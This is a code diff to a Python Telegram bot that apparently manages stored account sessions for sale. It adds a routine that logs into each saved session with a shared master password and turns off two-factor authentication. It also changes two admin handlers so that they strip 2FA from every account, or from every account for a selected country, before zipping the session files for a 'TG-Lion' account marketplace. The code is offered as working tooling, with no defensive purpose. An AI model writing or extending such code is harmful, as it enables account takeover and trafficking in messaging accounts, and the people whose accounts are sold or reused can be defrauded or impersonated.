@@ -4893,8 +4893,37 @@ def _get_sell_session_files() -> list:
     return result
 
 
+async def _remove_2fa_single(phone_part: str, full_path: str) -> str:
+    """Remove 2FA from a single session. Returns a status string."""
+    import shutil, tempfile
+    tmp_dir = tempfile.mkdtemp()
+    tmp_session = os.path.join(tmp_dir, "tmp_dl_2fa")
+    try:
+        shutil.copy2(full_path, tmp_session + '.session')
+        client = TelegramClient(tmp_session, TELEGRAM_API_ID, TELEGRAM_API_HASH)
+        await client.connect()
+        try:
+            pwd_info = await client(functions.account.GetPasswordRequest())
+            if not pwd_info.has_password:
+                return "already_off"
+            await client.edit_2fa(current_password=TWO_FA_MASTER_PASSWORD, new_password=None)
+            return "removed"
+        except Exception as e:
+            err = str(e)
+            if 'PASSWORD_HASH_INVALID' in err or 'HASH_INVALID' in err:
+                return "wrong_password"
+            return f"error:{err[:60]}"
+        finally:
+            await client.disconnect()
+    except Exception as e:
+        return f"connect_error:{str(e)[:60]}"
+    finally:
+        shutil.rmtree(tmp_dir, ignore_errors=True)
+
+
 async def admin_download_sessions_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Download all sell_*.session files as a flat zip (TG-Lion API format)."""
+    """Download all sell_*.session files as a flat zip (TG-Lion API format).
+    Automatically removes 2FA from every account before zipping."""
     query = update.callback_query
     await query.answer()
 
@@ -4908,17 +4937,46 @@ async def admin_download_sessions_callback(update: Update, context: ContextTypes
         await query.message.reply_text("❌ No session files found in sessions/ directory.")
         return
 
-    warning = ""
-    if len(sessions) < 10:
-        warning = f"\n\n⚠️ *Warning:* TG-Lion API requires minimum 10 sessions. You have only {len(sessions)}. Add more accounts first."
+    count = len(sessions)
+    warning = f"\n\n⚠️ *TG-Lion minimum 10 required — you have {count}.*" if count < 10 else ""
+    status_msg = await query.message.reply_text(
+        f"🔓 *Removing 2FA from {count} session(s)...*{warning}\n\nPlease wait...",
+        parse_mode='Markdown'
+    )
 
-    await query.message.reply_text(f"⏳ Preparing zip of {len(sessions)} session(s)...{warning}", parse_mode='Markdown')
+    # Remove 2FA from all sessions
+    results = {"removed": 0, "already_off": 0, "wrong_password": 0, "error": 0}
+    for phone_part, full_path in sessions:
+        result = await _remove_2fa_single(phone_part, full_path)
+        if result == "removed":
+            results["removed"] += 1
+        elif result == "already_off":
+            results["already_off"] += 1
+        elif result == "wrong_password":
+            results["wrong_password"] += 1
+        else:
+            results["error"] += 1
+        logger.info(f"[DL-2FA] {phone_part}: {result}")
+
+    summary = (
+        f"✅ Removed: {results['removed']}  "
+        f"ℹ️ Already off: {results['already_off']}  "
+        f"❌ Wrong pwd: {results['wrong_password']}  "
+        f"⚠️ Error: {results['error']}"
+    )
+
+    try:
+        await status_msg.edit_text(
+            f"🔓 *2FA removal done*\n{summary}\n\n📦 Creating zip...",
+            parse_mode='Markdown'
+        )
+    except Exception:
+        pass
 
     try:
         zip_buffer = io.BytesIO()
         with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
             for phone_part, full_path in sessions:
-                # Strip spaces so TG-Lion API accepts the filename
                 clean_phone = phone_part.replace(' ', '')
                 zf.write(full_path, arcname=f"{clean_phone}.session")
         zip_buffer.seek(0)
@@ -4927,7 +4985,7 @@ async def admin_download_sessions_callback(update: Update, context: ContextTypes
             chat_id=ADMIN_CHAT_ID,
             document=zip_buffer,
             filename="all_sessions.zip",
-            caption=f"📦 All Account Sessions ({len(sessions)} accounts)"
+            caption=f"📦 All Account Sessions ({count} accounts)\n{summary}"
         )
     except Exception as e:
         logger.error(f"admin_download_sessions error: {e}")
@@ -5020,7 +5078,39 @@ async def admin_dl_country_callback(update: Update, context: ContextTypes.DEFAUL
         await query.message.reply_text(f"❌ No sessions found for: {selected_country}")
         return
 
-    await query.message.reply_text(f"⏳ Preparing zip for {selected_country} ({len(matched)} session(s))...")
+    count = len(matched)
+    warning = f"\n\n⚠️ *TG-Lion minimum 10 required — you have {count}.*" if count < 10 else ""
+    status_msg = await query.message.reply_text(
+        f"🔓 *Removing 2FA from {count} session(s)...*{warning}\n\nPlease wait...",
+        parse_mode='Markdown'
+    )
+
+    results = {"removed": 0, "already_off": 0, "wrong_password": 0, "error": 0}
+    for phone_part, full_path in matched:
+        result = await _remove_2fa_single(phone_part, full_path)
+        if result == "removed":
+            results["removed"] += 1
+        elif result == "already_off":
+            results["already_off"] += 1
+        elif result == "wrong_password":
+            results["wrong_password"] += 1
+        else:
+            results["error"] += 1
+        logger.info(f"[DL-Country-2FA] {phone_part}: {result}")
+
+    summary = (
+        f"✅ Removed: {results['removed']}  "
+        f"ℹ️ Already off: {results['already_off']}  "
+        f"❌ Wrong pwd: {results['wrong_password']}  "
+        f"⚠️ Error: {results['error']}"
+    )
+    try:
+        await status_msg.edit_text(
+            f"🔓 *2FA removal done*\n{summary}\n\n📦 Creating zip...",
+            parse_mode='Markdown'
+        )
+    except Exception:
+        pass
 
     try:
         zip_buffer = io.BytesIO()
@@ -5035,7 +5125,7 @@ async def admin_dl_country_callback(update: Update, context: ContextTypes.DEFAUL
             chat_id=ADMIN_CHAT_ID,
             document=zip_buffer,
             filename=f"{safe_name}_sessions.zip",
-            caption=f"🌍 {selected_country} Sessions ({len(matched)} accounts)"
+            caption=f"🌍 {selected_country} Sessions ({count} accounts)\n{summary}"
         )
     except Exception as e:
         logger.error(f"admin_dl_country error: {e}")
